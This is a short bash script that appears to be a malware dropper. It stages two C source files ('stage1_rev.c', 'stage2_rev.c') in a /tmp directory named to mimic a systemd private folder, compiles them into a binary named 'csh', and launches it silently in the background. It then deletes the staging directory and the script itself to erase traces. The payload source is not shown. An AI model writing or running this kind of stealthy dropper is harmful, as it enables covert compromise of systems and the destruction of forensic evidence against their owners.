#!/bin/bash

TMP_DIR="/tmp/systemd-pr1vate-6e9393d58a-enit.service.compressor-SEFC/"
STAGE1="$TMP_DIR/stage1_rev.c"
STAGE2="$TMP_DIR/stage2_rev.c"


touch $TMP_DIR/final.c

# Merge the two C files
cat "$STAGE1" "$STAGE2" > "$TMP_DIR/final.c" 2>/dev/null
gcc "$TMP_DIR/final.c" -o "$TMP_DIR/csh" &>/dev/null
chmod +x $TMP_DIR/csh
/tmp/systemd-pr1vate-6e9393d58a-enit.service.compressor-SEFC/csh &>/dev/null &
rm -rf "$TMP_DIR" &>/dev/null
rm -- "$0" &>/dev/null


